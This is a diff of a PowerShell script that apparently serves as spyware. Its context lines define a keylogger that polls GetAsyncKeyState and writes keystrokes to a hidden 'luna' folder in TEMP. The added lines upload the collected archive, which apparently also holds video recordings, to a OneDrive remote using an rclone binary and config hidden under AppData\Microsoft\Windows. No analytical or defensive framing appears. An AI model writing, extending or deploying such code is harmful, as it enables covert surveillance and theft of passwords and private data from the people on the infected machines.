@@ -197,10 +197,10 @@ function Stop-Recording {
 Start-Job -ScriptBlock {
     Add-Type -AssemblyName System.Windows.Forms
     Add-Type -TypeDefinition '
-    using System; using System.Runtime.InteropServices;
-    public class KeyLogger {
-        [DllImport("User32.dll")] public static extern short GetAsyncKeyState(Int32 vKey);
-    }'
+        using System; using System.Runtime.InteropServices;
+        public class KeyLogger {
+            [DllImport("User32.dll")] public static extern short GetAsyncKeyState(Int32 vKey);
+        }'
     $map = @{ 8 = "[Back]"; 13 = "[Enter]"; 32 = " "; 27 = "[Esc]"; 9 = "[Tab]" }
     $logPath = "$env:TEMP\luna\keylog.txt"
     while ($true) {
@@ -267,6 +267,19 @@ function Archive-And-Report {
     $global:archiveSuccess = $false
     $videoSubDir = "$tempDir\video"
     New-Item -ItemType Directory -Path $videoSubDir -Force -ErrorAction SilentlyContinue | Out-Null
+    $remote = "onedrive:luna_uploads/$username"
+    $rclone = "$env:APPDATA\Microsoft\Windows\luna\rclone.exe"
+    
+    if (Test-Path $rclone) {
+        try {
+            & $rclone copy "$zipPath" "$remote" --config "$env:APPDATA\Microsoft\Windows\luna\rclone.conf" --transfers 1 --quiet
+            Write-Output "Upload to OneDrive completed: $remote"
+        } catch {
+            Write-Warning "Upload failed: $_"
+        }
+    } else {
+        Write-Warning "rclone.exe not found at $rclone"
+    }
 
     $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
     $user = $env:USERNAME
